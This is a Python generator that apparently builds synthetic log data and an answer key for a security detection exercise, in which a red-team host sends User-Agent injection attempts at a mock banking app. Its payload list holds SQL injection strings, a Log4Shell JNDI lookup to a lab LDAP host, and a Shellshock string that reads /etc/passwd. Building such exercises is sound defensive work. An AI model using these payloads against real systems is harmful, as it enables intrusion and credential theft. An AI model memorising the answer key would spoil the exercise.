#!/usr/bin/env python3
"""
what:    Injection strings in the User-Agent against enta-app01, plus normal browsing noise
owner:   AIC-A3
usage:   ./generate.py --seed 1 --out events.jsonl
reads:   scenario.yaml next to this file
changes: writes --out and answer-key.yaml only
safe to run again: yes (deterministic for a given --seed)
"""
import argparse
import pathlib
import sys
from datetime import timedelta

HERE = pathlib.Path(__file__).parent
sys.path.insert(0, str(HERE.parent))
from _lib import START, Scenario  # noqa: E402

RED = {"ip": "10.60.1.9", "team": "JS26-R-001"}
PAYLOADS = [
    "sqlmap/1.8#stable (https://sqlmap.org)",
    "Mozilla/5.0' OR '1'='1",
    "${jndi:ldap://10.60.1.9:1389/a}",
    'Mozilla/5.0" UNION SELECT username,password FROM users--',
    "() { :; }; /bin/cat /etc/passwd",
]
PAGES = ["/", "/accounts", "/statements", "/transfers", "/help"]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--out", default=str(HERE / "events.jsonl"))
    a = ap.parse_args()
    s = Scenario(HERE, a.seed)
    r = s.rng

    # Benign: customers browsing from the Blue side.
    for _ in range(40):
        at = START + timedelta(seconds=r.randint(0, 600))
        s.event(at, "ingress", "http_request", "low", "success", actor={"ip": f"10.61.1.{r.randint(10, 80)}"},
                endpoint=f"GET {r.choice(PAGES)}", metadata={"status": 200, "user_agent": "Mozilla/5.0 (Linux; Android 14)"})

    # Attack: each payload twice, the app rejects them, then one search breaks the app.
    t = START + timedelta(minutes=3)
    for ua in PAYLOADS * 2:
        t += timedelta(seconds=r.randint(2, 6))
        s.event(t, "ingress", "http_request", "medium", "failure", actor=dict(RED), endpoint="GET /search",
                malicious=True, attack=["T1190"], metadata={"status": 400, "user_agent": ua, "path": "/search?q=test"})
        s.event(t + timedelta(milliseconds=12), "application", "input_rejected", "medium", "denied", actor=dict(RED),
                endpoint="/search", obj="user_agent", malicious=True, attack=["T1190"],
                metadata={"original_event": "input_rejected", "field": "user_agent", "rule": "suspicious_characters"})
    t += timedelta(seconds=5)
    s.event(t, "ingress", "http_request", "high", "error", actor=dict(RED), endpoint="GET /search", malicious=True,
            attack=["T1190"], metadata={"status": 500, "user_agent": "Mozilla/5.0", "path": "/search?q=%27%20OR%201%3D1--"})

    s.write(a.out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
